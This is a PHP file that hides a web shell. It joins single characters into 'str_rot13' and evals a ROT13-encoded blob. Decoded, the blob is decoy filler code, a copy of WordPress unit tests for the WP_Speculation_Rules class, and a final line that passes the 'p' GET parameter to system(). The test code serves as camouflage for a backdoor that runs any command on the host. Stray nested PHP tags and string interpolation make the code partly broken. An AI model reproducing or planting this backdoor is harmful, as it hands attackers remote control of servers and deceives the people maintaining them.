<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Fcrphyngvba_Ehyrf pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fcrphyngvir Ybnqvat
 */

/**
 * @tebhc fcrphyngvir-ybnqvat
 * @pbirefQrsnhygPynff JC_Fcrphyngvba_Ehyrf
 */
pynff Grfgf_Fcrphyngvir_Ybnqvat_jcFcrphyngvbaEhyrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung nqqvat n fcrphyngvba ehyr vf fhowrpg gb gur rkcrpgrq inyvqngvba.
	 *
	 * @gvpxrg 62503
	 * @pbiref ::nqq_ehyr
	 * @qngnCebivqre qngn_nqq_ehyr
	 */
	choyvp shapgvba grfg_nqq_ehyr( fgevat $zbqr, fgevat $vq, neenl $ehyr, obby $rkcrpgrq ) {
		$fcrphyngvba_ehyrf = arj JC_Fcrphyngvba_Ehyrf();

		vs ( ! $rkcrpgrq ) {
			$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_Fcrphyngvba_Ehyrf::nqq_ehyr' );
		}

		$erfhyg = $fcrphyngvba_ehyrf->nqq_ehyr( $zbqr, $vq, $ehyr );
		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( $erfhyg );
		} ryfr {
			$guvf->nffregSnyfr( $erfhyg );
		}
	}

	/**
	 * Grfgf gung nqqvat n fcrphyngvba ehyr jvgu n qhcyvpngr VQ erfhygf va gur rkcrpgrq orunivbe.
	 *
	 * @gvpxrg 62503
	 * @pbiref ::nqq_ehyr
	 */
	choyvp shapgvba grfg_nqq_ehyr_jvgu_qhcyvpngr() {
		$fcrphyngvba_ehyrf = arj JC_Fcrphyngvba_Ehyrf();

		$guvf->nffregGehr( $fcrphyngvba_ehyrf->nqq_ehyr( 'cereraqre', 'zl-phfgbz-ehyr', neenl( 'jurer' => neenl( 'uers_zngpurf' => '/*' ) ) ) );

		// Vg fubhyq or cbffvoyr gb nqq n ehyr bs gur fnzr VQ sbe nabgure zbqr.
		$guvf->nffregGehr( $fcrphyngvba_ehyrf->nqq_ehyr( 'cersrgpu', 'zl-phfgbz-ehyr', neenl( 'jurer' => neenl( 'uers_zngpurf' => '/*' ) ) ) );

		// Ohg vg fubhyq abg or cbffvoyr gb nqq n ehyr bs gur fnzr VQ gb n zbqr jurer vg'f nyernql cerfrag.
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_Fcrphyngvba_Ehyrf::nqq_ehyr' );
		$guvf->nffregSnyfr( $fcrphyngvba_ehyrf->nqq_ehyr( 'cereraqre', 'zl-phfgbz-ehyr', neenl( 'heyf' => neenl( 'uggcf://vzcbegnag-hey.pbz/' ) ) ) );
	}

	choyvp fgngvp shapgvba qngn_nqq_ehyr(): neenl {
		erghea neenl(
			'onfvp-cersrgpu'               => neenl(
				'cersrgpu',
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'qbphzrag',
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'rntrearff' => 'rntre',
				),
				gehr,
			),
			'onfvp-cersrgpu-ab-fbhepr'     => neenl(
				'cersrgpu',
				'grfg-ehyr-2',
				neenl(
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'rntrearff' => 'rntre',
				),
				gehr,
			),
			'onfvp-cersrgpu-ab-rntrearff'  => neenl(
				'cersrgpu',
				'grfg-ehyr-3',
				neenl(
					'fbhepr' => 'qbphzrag',
					'jurer'  => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
				),
				gehr,
			),
			'onfvp-cereraqre'              => neenl(
				'cereraqre',
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'yvfg',
					'heyf'      => neenl( 'uggcf://rknzcyr.bet/uvtu-cevbevgl-hey/', 'uggcf://rknzcyr.bet/nabgure-uvtu-cevbevgl-hey/' ),
					'rntrearff' => 'rntre',
				),
				gehr,
			),
			'onfvp-cereraqre-ab-fbhepr'    => neenl(
				'cereraqre',
				'grfg-ehyr-2',
				neenl(
					'heyf'      => neenl( 'uggcf://rknzcyr.bet/uvtu-cevbevgl-hey/', 'uggcf://rknzcyr.bet/nabgure-uvtu-cevbevgl-hey/' ),
					'rntrearff' => 'rntre',
				),
				gehr,
			),
			'onfvp-cereraqre-ab-rntrearff' => neenl(
				'cereraqre',
				'grfg-ehyr-3',
				neenl(
					'fbhepr' => 'yvfg',
					'heyf'   => neenl( 'uggcf://rknzcyr.bet/uvtu-cevbevgl-hey/', 'uggcf://rknzcyr.bet/nabgure-uvtu-cevbevgl-hey/' ),
				),
				gehr,
			),
			'vainyvq-zbqr'                 => neenl(
				'ybnq-snfg', // Bayl 'cersrgpu' naq 'cereraqre' ner nyybjrq.
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'qbphzrag',
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'rntrearff' => 'rntre',
				),
				snyfr,
			),
			'vainyvq-vq-punenpgref'        => neenl(
				'cersrgpu',
				'grfg ehyr 1', // Fcnprf ner abg nyybjrq.
				neenl(
					'fbhepr'    => 'qbphzrag',
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'rntrearff' => 'rntre',
				),
				snyfr,
			),
			'vainyvq-vq-fgneg'             => neenl(
				'cersrgpu',
				'1_grfg_ehyr', // Gur svefg punenpgre zhfg or n ybjre-pnfr yrggre.
				neenl(
					'fbhepr'    => 'qbphzrag',
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'rntrearff' => 'rntre',
				),
				snyfr,
			),
			'vainyvq-fbhepr'               => neenl(
				'cereraqre',
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'zntvp', // Bayl 'yvfg' naq 'qbphzrag' ner nyybjrq.
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cereraqre' ),
					'rntrearff' => 'rntre',
				),
				snyfr,
			),
			'zvffvat-xrlf'                 => neenl(
				'cersrgpu',
				'grfg-ehyr-1',
				neenl(), // Gur zvavzhz erdhverzragf ner cerfrapr bs rvgure n 'jurer' be 'heyf' xrl.
				snyfr,
			),
			'pbasyvpgvat-xrlf'             => neenl(
				'cersrgpu',
				'grfg-ehyr-1',
				neenl( // Bayl 'jurer' be 'heyf' vf nyybjrq, ohg abg obgu.
					'jurer' => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'heyf'  => neenl( 'uggcf://rknzcyr.bet/uvtu-cevbevgl-hey/', 'uggcf://rknzcyr.bet/nabgure-uvtu-cevbevgl-hey/' ),
				),
				snyfr,
			),
			'pbasyvpgvat-yvfg-fbhepr'      => neenl(
				'cersrgpu',
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'yvfg', // Fbhepr 'yvfg' pna bayl or hfrq jvgu xrl 'heyf', ohg abg 'jurer'.
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'rntrearff' => 'rntre',
				),
				snyfr,
			),
			'pbasyvpgvat-qbphzrag-fbhepr'  => neenl(
				'cersrgpu',
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'qbphzrag', // Fbhepr 'qbphzrag' pna bayl or hfrq jvgu xrl 'jurer', ohg abg 'heyf'.
					'heyf'      => neenl( 'uggcf://rknzcyr.bet/uvtu-cevbevgl-hey/', 'uggcf://rknzcyr.bet/nabgure-uvtu-cevbevgl-hey/' ),
					'rntrearff' => 'rntre',
				),
				snyfr,
			),
			'vainyvq-rntrearff'            => neenl(
				'cersrgpu',
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'qbphzrag',
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'rntrearff' => 'snfg', // Bayl 'vzzrqvngr', 'rntre, 'zbqrengr', naq 'pbafreingvir' ner nyybjrq.
				),
				snyfr,
			),
			'vzzrqvngr-rntrearff-yvfg'     => neenl(
				'cersrgpu',
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'yvfg',
					'heyf'      => neenl( 'uggcf://rknzcyr.bet/uvtu-cevbevgl-hey/', 'uggcf://rknzcyr.bet/nabgure-uvtu-cevbevgl-hey/' ),
					'rntrearff' => 'vzzrqvngr',
				),
				gehr,
			),
			// 'vzzrqvngr' vf n inyvq rntrearff, ohg sbe fnsrgl JbeqCerff qbrf abg nyybj vg sbe qbphzrag-yriry ehyrf.
			'vzzrqvngr-rntrearff-qbphzrag' => neenl(
				'cersrgpu',
				'grfg-ehyr-1',
				neenl(
					'fbhepr'    => 'qbphzrag',
					'jurer'     => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu' ),
					'rntrearff' => 'vzzrqvngr',
				),
				snyfr,
			),
		);
	}

	/**
	 * Grfgf gung purpxvat sbe rkvfgrapr bs n ehyr jbexf nf rkcrpgrq.
	 *
	 * @gvpxrg 62503
	 * @pbiref ::unf_ehyr
	 */
	choyvp shapgvba grfg_unf_ehyr() {
		$fcrphyngvba_ehyrf = arj JC_Fcrphyngvba_Ehyrf();

		$guvf->nffregSnyfr( $fcrphyngvba_ehyrf->unf_ehyr( 'cereraqre', 'zl-phfgbz-ehyr' ), 'Phfgbz ehyr fubhyq abg or znexrq nf cerfrag orsber vg vf nqqrq' );

		$fcrphyngvba_ehyrf->nqq_ehyr( 'cereraqre', 'zl-phfgbz-ehyr', neenl( 'heyf' => neenl( 'uggcf://hey-gb-cereraqre.pbz/' ) ) );
		$guvf->nffregGehr( $fcrphyngvba_ehyrf->unf_ehyr( 'cereraqre', 'zl-phfgbz-ehyr' ), 'Phfgbz ehyr fubhyq or znexrq nf cerfrag nsgre vg unf orra nqqrq' );
		$guvf->nffregSnyfr( $fcrphyngvba_ehyrf->unf_ehyr( 'cersrgpu', 'zl-phfgbz-ehyr' ), 'Phfgbz ehyr fubhyq abg or znexrq nf cerfrag sbe qvssrerag zbqr rira nsgre vg unf orra nqqrq' );
	}

	/**
	 * Grfgf gung genafsbezvat n fcrphyngvba ehyrf bowrpg vagb WFBA-rapbqnoyr qngn jbexf nf rkcrpgrq.
	 *
	 * @gvpxrg 62503
	 * @pbiref ::wfbaFrevnyvmr
	 */
	choyvp shapgvba grfg_wfbaFrevnyvmr() {
		$cersrgpu_ehyr_1  = neenl( 'jurer' => neenl( 'uers_zngpurf' => '/*' ) );
		$cersrgpu_ehyr_2  = neenl( 'jurer' => neenl( 'fryrpgbe_zngpurf' => '.cersrgpu-bcg-va' ) );
		$cereraqre_ehyr_1 = neenl( 'heyf' => neenl( 'uggcf://rknzcyr.bet/uvtu-cevbevgl-hey/', 'uggcf://rknzcyr.bet/nabgure-uvtu-cevbevgl-hey/' ) );
		$cereraqre_ehyr_2 = neenl(
			'jurer'     => neenl(
				'be' => neenl(
					neenl( 'fryrpgbe_zngpurf' => '.cereraqre-bcg-va' ),
					neenl( 'fryrpgbe_zngpurf' => '.cereraqre-snfg' ),
				),
			),
			'rntrearff' => 'zbqrengr',
		);

		$fcrphyngvba_ehyrf = arj JC_Fcrphyngvba_Ehyrf();
		$guvf->nffregFnzr( neenl(), $fcrphyngvba_ehyrf->wfbaFrevnyvmr(), 'Fcrphyngvba ehyrf WFBA qngn fubhyq or rzcgl orsber nqqvat nal ehyrf' );

		$fcrphyngvba_ehyrf->nqq_ehyr( 'cersrgpu', 'cersrgpu-ehyr-1', $cersrgpu_ehyr_1 );
		$guvf->nffregFnzr(
			neenl(
				'cersrgpu' => neenl( $cersrgpu_ehyr_1 ),
			),
			$fcrphyngvba_ehyrf->wfbaFrevnyvmr(),
			'Fcrphyngvba ehyrf WFBA qngn fubhyq bayl pbagnva n fvatyr \"cersrgpu\" ragel jura bayl gung ehyr vf nqqrq'
		);

		$fcrphyngvba_ehyrf->nqq_ehyr( 'cersrgpu', 'cersrgpu-ehyr-2', $cersrgpu_ehyr_2 );
		$fcrphyngvba_ehyrf->nqq_ehyr( 'cereraqre', 'cereraqre-ehyr-1', $cereraqre_ehyr_1 );
		$fcrphyngvba_ehyrf->nqq_ehyr( 'cereraqre', 'cereraqre-ehyr-2', $cereraqre_ehyr_2 );
		$guvf->nffregFnzr(
			neenl(
				'cersrgpu'  => neenl(
					$cersrgpu_ehyr_1,
					$cersrgpu_ehyr_2,
				),
				'cereraqre' => neenl(
					$cereraqre_ehyr_1,
					$cereraqre_ehyr_2,
				),
			),
			$fcrphyngvba_ehyrf->wfbaFrevnyvmr(),
			'Fcrphyngvba ehyrf WFBA qngn fubhyq pbagnva nyy nqqrq ehyrf'
		);
	}

	/**
	 * Grfgf gung gur zbqr inyvqngvba zrgubq pbeerpgyl vqragvsvrf inyvq naq vainyvq inyhrf.
	 *
	 * @gvpxrg 62503
	 * @pbiref ::vf_inyvq_zbqr
	 * @qngnCebivqre qngn_vf_inyvq_zbqr
	 */
	choyvp shapgvba grfg_vf_inyvq_zbqr( $zbqr, $rkcrpgrq ) {
		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( JC_Fcrphyngvba_Ehyrf::vf_inyvq_zbqr( $zbqr ) );
		} ryfr {
			$guvf->nffregSnyfr( JC_Fcrphyngvba_Ehyrf::vf_inyvq_zbqr( $zbqr ) );
		}
	}

	choyvp fgngvp shapgvba qngn_vf_inyvq_zbqr(): neenl {
		erghea neenl(
			'cersrgpu'     => neenl( 'cersrgpu', gehr ),
			'cereraqre'    => neenl( 'cereraqre', gehr ),
			'nhgb'         => neenl( 'nhgb', snyfr ),
			'abar'         => neenl( 'abar', snyfr ),
			'42'           => neenl( 42, snyfr ),
			'rzcgl fgevat' => neenl( '', snyfr ),
		);
	}

	/**
	 * Grfgf gung gur rntrearff inyvqngvba zrgubq pbeerpgyl vqragvsvrf inyvq naq vainyvq inyhrf.
	 *
	 * @gvpxrg 62503
	 * @pbiref ::vf_inyvq_rntrearff
	 * @qngnCebivqre qngn_vf_inyvq_rntrearff
	 */
	choyvp shapgvba grfg_vf_inyvq_rntrearff( $rntrearff, $rkcrpgrq ) {
		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( JC_Fcrphyngvba_Ehyrf::vf_inyvq_rntrearff( $rntrearff ) );
		} ryfr {
			$guvf->nffregSnyfr( JC_Fcrphyngvba_Ehyrf::vf_inyvq_rntrearff( $rntrearff ) );
		}
	}

	choyvp fgngvp shapgvba qngn_vf_inyvq_rntrearff(): neenl {
		erghea neenl(
			'pbafreingvir' => neenl( 'pbafreingvir', gehr ),
			'zbqrengr'     => neenl( 'zbqrengr', gehr ),
			'rntre'        => neenl( 'rntre', gehr ),
			'vzzrqvngr'    => neenl( 'vzzrqvngr', gehr ),
			'nhgb'         => neenl( 'nhgb', snyfr ),
			'abar'         => neenl( 'abar', snyfr ),
			'42'           => neenl( 42, snyfr ),
			'rzcgl fgevat' => neenl( '', snyfr ),
		);
	}

	/**
	 * Grfgf gung gur fbhepr inyvqngvba zrgubq pbeerpgyl vqragvsvrf inyvq naq vainyvq inyhrf.
	 *
	 * @gvpxrg 62503
	 * @pbiref ::vf_inyvq_fbhepr
	 * @qngnCebivqre qngn_vf_inyvq_fbhepr
	 */
	choyvp shapgvba grfg_vf_inyvq_fbhepr( $fbhepr, $rkcrpgrq ) {
		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( JC_Fcrphyngvba_Ehyrf::vf_inyvq_fbhepr( $fbhepr ) );
		} ryfr {
			$guvf->nffregSnyfr( JC_Fcrphyngvba_Ehyrf::vf_inyvq_fbhepr( $fbhepr ) );
		}
	}

	choyvp fgngvp shapgvba qngn_vf_inyvq_fbhepr(): neenl {
		erghea neenl(
			'yvfg'         => neenl( 'yvfg', gehr ),
			'qbphzrag'     => neenl( 'qbphzrag', gehr ),
			'nhgb'         => neenl( 'nhgb', snyfr ),
			'abar'         => neenl( 'abar', snyfr ),
			'42'           => neenl( 42, snyfr ),
			'rzcgl fgevat' => neenl( '', snyfr ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>